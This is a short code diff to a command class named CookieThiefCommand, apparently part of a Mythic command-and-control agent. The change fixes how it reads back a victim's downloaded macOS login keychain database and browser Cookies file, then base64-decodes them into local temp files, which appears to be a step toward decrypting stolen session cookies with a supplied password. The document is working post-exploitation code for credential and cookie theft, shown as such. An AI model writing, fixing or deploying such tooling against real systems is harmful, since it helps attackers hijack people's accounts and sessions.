@@ -68,7 +68,7 @@ class CookieThiefCommand(CommandBase):
         password = task.args.get_arg("password")
         getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id,filename="login.keychain-db", limit_by_callback=True, max_results=1, get_contents=True)
         if getkeychainDBResp.status == "success":
-            getkeychainDBResp = getkeychainDBResp[0]
+            getkeychainDBResp = getkeychainDBResp.response[0]
         else:
             print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
             sys.stdout.flush()
@@ -132,12 +132,12 @@ class CookieThiefCommand(CommandBase):
         ## write the cookies file to a new file on disk
         getCookiesResp = await MythicRPC().execute("get_file", task_id=task.id,filename="Cookies", limit_by_callback=True, max_results=1, get_contents=True)
         if getCookiesResp.status == "success":
-            getCookiesResp = getCookiesResp[0]
+            getCookiesResp = getCookiesResp.response[0]
         else:
             print("Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
             sys.stdout.flush()
         try:
-            f = open("tmp_login.keychain-db", "wb")
+            f = open("tmp_Cookies", "wb")
             f.write(base64.b64decode(getCookiesResp["contents"]))
             f.close()
         except Exception as e:
